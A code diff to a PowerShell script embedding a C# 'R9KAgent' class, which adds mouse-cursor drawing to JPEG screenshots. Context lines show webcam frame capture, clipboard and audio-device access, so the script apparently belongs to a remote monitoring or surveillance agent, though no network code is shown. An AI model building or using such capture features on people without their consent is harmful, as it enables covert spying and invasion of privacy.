@@ -145,6 +145,19 @@ if (-not ("R9KAgent" -as [type])) {
         [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GlobalFree(IntPtr hMem);
         [DllImport("ole32.dll")] public static extern void CoTaskMemFree(IntPtr pv);
 
+        [DllImport("user32.dll")] public static extern bool GetCursorInfo(ref CURSORINFO pci);
+        [DllImport("user32.dll")] public static extern bool DrawIconEx(IntPtr hdc, int xLeft, int yTop, IntPtr hIcon, int cxWidth, int cyWidth, int istepIfAniCur, IntPtr hbrFlickerFreeDraw, int diFlags);
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct CURSORINFO {
+            public int cbSize;
+            public int flags;
+            public IntPtr hCursor;
+            public POINT ptScreenPos;
+        }
+        [StructLayout(LayoutKind.Sequential)]
+        public struct POINT { public int X; public int Y; }
+
         const uint CF_UNICODETEXT = 13;
         const uint GMEM_MOVEABLE = 2;
         const uint WM_CAP_START = 0x0400;
@@ -152,6 +165,8 @@ if (-not ("R9KAgent" -as [type])) {
         const uint WM_CAP_DRIVER_DISCONNECT = WM_CAP_START + 11;
         const uint WM_CAP_FILE_SAVEDIB = WM_CAP_START + 25;
         const uint WM_CAP_GRAB_FRAME = WM_CAP_START + 60;
+        const int CURSOR_SHOWING = 0x0001;
+        const int DI_NORMAL = 0x0003;
 
         [ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }
         [ComImport, Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
@@ -772,15 +787,38 @@ if (-not ("R9KAgent" -as [type])) {
                         reuseGfx = Graphics.FromImage(reuseBmp);
                     }
                     reuseGfx.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);
+
                     Bitmap finalBmp = reuseBmp;
+                    float scale = 1.0f;
                     if (maxW > 0 && reuseBmp.Width > maxW) {
-                        int newW = maxW, newH = (int)(reuseBmp.Height * ((float)maxW / reuseBmp.Width));
+                        int newW = maxW;
+                        int newH = (int)(reuseBmp.Height * ((float)maxW / reuseBmp.Width));
                         finalBmp = new Bitmap(newW, newH);
                         using (Graphics g2 = Graphics.FromImage(finalBmp)) {
                             g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
                             g2.DrawImage(reuseBmp, 0, 0, newW, newH);
                         }
+                        scale = (float)newW / reuseBmp.Width;
                     }
+
+                    CURSORINFO ci = new CURSORINFO();
+                    ci.cbSize = Marshal.SizeOf(typeof(CURSORINFO));
+                    if (GetCursorInfo(ref ci)
+                        && (ci.flags & CURSOR_SHOWING) != 0
+                        && ci.hCursor != IntPtr.Zero) {
+                        int sx = ci.ptScreenPos.X - bounds.X;
+                        int sy = ci.ptScreenPos.Y - bounds.Y;
+                        if (sx >= 0 && sy >= 0 && sx < reuseBmp.Width && sy < reuseBmp.Height) {
+                            int dx = (int)(sx * scale);
+                            int dy = (int)(sy * scale);
+                            using (Graphics g3 = Graphics.FromImage(finalBmp)) {
+                                IntPtr hdc = g3.GetHdc();
+                                DrawIconEx(hdc, dx, dy, ci.hCursor, 0, 0, 0, IntPtr.Zero, DI_NORMAL);
+                                g3.ReleaseHdc(hdc);
+                            }
+                        }
+                    }
+
                     using (MemoryStream ms = new MemoryStream()) {
                         EnsureJpegCodec(quality);
                         finalBmp.Save(ms, jpgCodec, jpgParams);
